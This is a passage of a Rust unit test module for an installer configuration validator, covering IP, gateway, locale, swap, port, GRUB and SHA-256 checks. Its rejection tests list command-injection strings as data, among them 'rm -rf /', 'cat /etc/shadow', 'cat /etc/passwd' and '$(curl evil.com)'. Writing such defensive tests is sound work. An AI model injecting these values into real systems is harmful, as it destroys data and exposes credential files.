                cfg.validate().is_err(),
                "wallpaper {:?} with unsafe characters must be rejected",
                bad
            );
        }
    }

    #[test]
    fn wallpaper_filename_accepts_safe_names() {
        for good in &[
            "/tmp/wallpaper.jpg",
            "/home/user/my-wallpaper_v2.png",
            "/media/background+image.webp",
        ] {
            let cfg = InjectConfig {
                wallpaper: Some(PathBuf::from(good)),
                ..Default::default()
            };
            assert!(
                cfg.validate().is_ok(),
                "wallpaper {:?} with safe filename must be accepted",
                good
            );
        }
    }

    #[test]
    fn static_ip_rejects_shell_metacharacters() {
        // static_ip is placed in cloud-init YAML, Kickstart --ip=, and preseed
        // directives.  Shell metacharacters must be rejected to prevent malformed
        // configs and potential injection into installer directives.
        for bad in &[
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && cat /etc/shadow",
            "$(curl evil.com)",
            "192.168.1.1\nnewline-injected",
        ] {
            let cfg = InjectConfig {
                static_ip: Some((*bad).to_string()),
                ..Default::default()
            };
            assert!(
                cfg.validate().is_err(),
                "static_ip {:?} must be rejected",
                bad
            );
        }
    }

    #[test]
    fn static_ip_accepts_valid_cidr() {
        for good in &["192.168.1.10/24", "10.0.0.1/8", "2001:db8::1/64"] {
            let cfg = InjectConfig {
                static_ip: Some((*good).to_string()),
                ..Default::default()
            };
            assert!(
                cfg.validate().is_ok(),
                "static_ip {:?} must be accepted",
                good
            );
        }
    }

    #[test]
    fn gateway_rejects_shell_metacharacters() {
        for bad in &["10.0.0.1; rm -rf /", "10.0.0.1 | cat /etc/passwd"] {
            let cfg = InjectConfig {
                gateway: Some((*bad).to_string()),
                ..Default::default()
            };
            assert!(
                cfg.validate().is_err(),
                "gateway {:?} must be rejected",
                bad
            );
        }
    }

    #[test]
    fn gateway_accepts_valid_ip() {
        for good in &["10.0.0.1", "192.168.1.1", "2001:db8::1"] {
            let cfg = InjectConfig {
                gateway: Some((*good).to_string()),
                ..Default::default()
            };
            assert!(
                cfg.validate().is_ok(),
                "gateway {:?} must be accepted",
                good
            );
        }
    }

    // ── Swap validation ────────────────────────────────────────────────────────

    #[test]
    fn inject_rejects_swap_size_zero() {
        let cfg = InjectConfig {
            swap: Some(SwapConfig {
                size_mb: 0,
                ..Default::default()
            }),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "swap.size_mb == 0 must be rejected"
        );
    }

    #[test]
    fn inject_accepts_swap_size_nonzero() {
        let cfg = InjectConfig {
            swap: Some(SwapConfig {
                size_mb: 512,
                ..Default::default()
            }),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "swap.size_mb 512 must be accepted");
    }

    #[test]
    fn inject_rejects_swappiness_over_100() {
        let cfg = InjectConfig {
            swap: Some(SwapConfig {
                size_mb: 1024,
                swappiness: Some(101),
                ..Default::default()
            }),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "swappiness 101 must be rejected (max 100)"
        );
    }

    #[test]
    fn inject_accepts_swappiness_at_boundary() {
        for v in [0u8, 60, 100] {
            let cfg = InjectConfig {
                swap: Some(SwapConfig {
                    size_mb: 1024,
                    swappiness: Some(v),
                    ..Default::default()
                }),
                ..Default::default()
            };
            assert!(cfg.validate().is_ok(), "swappiness {v} must be accepted");
        }
    }

    // ── Port validation ────────────────────────────────────────────────────────

    #[test]
    fn inject_rejects_port_zero() {
        let cfg = InjectConfig {
            firewall: FirewallConfig {
                allow_ports: vec!["0".to_string()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err(), "port 0 must be rejected");
    }

    #[test]
    fn inject_rejects_port_over_65535() {
        let cfg = InjectConfig {
            firewall: FirewallConfig {
                allow_ports: vec!["99999".to_string()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err(), "port 99999 must be rejected");
    }

    #[test]
    fn inject_accepts_port_range_valid() {
        let cfg = InjectConfig {
            firewall: FirewallConfig {
                allow_ports: vec![
                    "80:443/tcp".to_string(),
                    "22".to_string(),
                    "ssh".to_string(),
                ],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "valid port specs must be accepted");
    }

    // ── GRUB timeout validation ────────────────────────────────────────────────

    #[test]
    fn inject_rejects_grub_timeout_over_3600() {
        let cfg = InjectConfig {
            grub: GrubConfig {
                timeout: Some(3601),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "grub_timeout > 3600 must be rejected"
        );
    }

    #[test]
    fn inject_accepts_grub_timeout_at_boundary() {
        for t in [0u32, 1, 10, 3600] {
            let cfg = InjectConfig {
                grub: GrubConfig {
                    timeout: Some(t),
                    ..Default::default()
                },
                ..Default::default()
            };
            assert!(cfg.validate().is_ok(), "grub_timeout {t} must be accepted");
        }
    }

    // ── timezone / locale / keyboard_layout validation ────────────────────────

    #[test]
    fn inject_rejects_timezone_with_semicolon() {
        let cfg = InjectConfig {
            timezone: Some("UTC; rm -rf /".into()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "timezone with ';' must be rejected"
        );
    }

    #[test]
    fn inject_accepts_valid_timezone() {
        for tz in ["UTC", "America/New_York", "Europe/London", "Etc/GMT+5"] {
            let cfg = InjectConfig {
                timezone: Some(tz.into()),
                ..Default::default()
            };
            assert!(cfg.validate().is_ok(), "timezone {tz:?} must be accepted");
        }
    }

    #[test]
    fn inject_rejects_locale_with_metachar() {
        let cfg = InjectConfig {
            locale: Some("en_US.UTF-8; evil".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err(), "locale with ';' must be rejected");
    }

    #[test]
    fn inject_accepts_valid_locale() {
        for loc in ["en_US.UTF-8", "de_DE", "zh_CN.UTF-8"] {
            let cfg = InjectConfig {
                locale: Some(loc.into()),
                ..Default::default()
            };
            assert!(cfg.validate().is_ok(), "locale {loc:?} must be accepted");
        }
    }

    #[test]
    fn inject_rejects_keyboard_layout_with_metachar() {
        let cfg = InjectConfig {
            keyboard_layout: Some("us$(id)".into()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "keyboard_layout with '$' must be rejected"
        );
    }

    #[test]
    fn inject_accepts_valid_keyboard_layout() {
        for kb in ["us", "de", "gb", "us-intl"] {
            let cfg = InjectConfig {
                keyboard_layout: Some(kb.into()),
                ..Default::default()
            };
            assert!(
                cfg.validate().is_ok(),
                "keyboard_layout {kb:?} must be accepted"
            );
        }
    }

    // ── expected_sha256 validation ─────────────────────────────────────────────

    #[test]
    fn inject_rejects_sha256_wrong_length() {
        let cfg = InjectConfig {
            expected_sha256: Some("abc123".into()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "expected_sha256 with wrong length must be rejected"
        );
    }

    #[test]
    fn inject_rejects_sha256_non_hex() {
        let cfg = InjectConfig {
            expected_sha256: Some("z".repeat(64)),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "expected_sha256 with non-hex chars must be rejected"
        );
    }

    #[test]
    fn inject_accepts_valid_sha256() {
        let cfg = InjectConfig {
            expected_sha256: Some(
                "a948904f2f0f479b8f936b0e0b4a12d4b9d1f2e3c4d5e6f7a8b9c0d1e2f3a4b5".into(),
            ),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "valid 64-char hex SHA-256 must pass"
        );
    }

    #[test]
    fn inject_accepts_sha256_uppercase() {
        // uppercase hex is normalised to lowercase before checking
        let cfg = InjectConfig {
            expected_sha256: Some(
                "A948904F2F0F479B8F936B0E0B4A12D4B9D1F2E3C4D5E6F7A8B9C0D1E2F3A4B5".into(),
            ),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "uppercase 64-char hex SHA-256 must pass"
        );
    }

    // ── dnf_mirror null byte ───────────────────────────────────────────────────

    #[test]
    fn inject_rejects_dnf_mirror_with_null_byte() {
        let cfg = InjectConfig {
            dnf_mirror: Some("https://mirror.example.com/\0evil".into()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "dnf_mirror with null byte must be rejected"
        );
    }

    // ── swap upper bound ───────────────────────────────────────────────────────

    #[test]
    fn inject_rejects_swap_size_exceeding_max() {
        let cfg = InjectConfig {
            swap: Some(SwapConfig {
                size_mb: 200_000,
                ..Default::default()
            }),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "swap size > 131072 MB must be rejected"
        );
    }

    #[test]
    fn inject_accepts_swap_size_at_max_boundary() {
        let cfg = InjectConfig {
            swap: Some(SwapConfig {
                size_mb: 131_072,
                ..Default::default()
            }),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "swap size exactly 131072 MB must be accepted"
        );
    }
}
